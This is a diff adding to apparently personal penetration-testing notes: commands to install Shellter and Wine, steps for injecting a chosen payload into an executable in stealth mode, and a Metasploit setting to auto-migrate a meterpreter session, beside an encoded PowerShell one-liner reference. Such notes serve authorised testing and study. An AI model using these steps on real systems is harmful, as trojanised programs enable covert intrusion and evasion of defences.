@@ -52,3 +52,23 @@ powershell -E <encoded oneliner>
 
 ```
 
+```
+apt-cache search shellter
+sudo apt install shellter
+sudo apt install wine
+```
+# shellter
+
+```
+start -> shellter
+select auto (A)
+supply full path of exe to be injected
+select Stealth mode
+select payload from list
+set options for payload
+```
+# migrating meterpreter session
+
+```
+set AutoRunScript post/windows/manage/migrate
+```
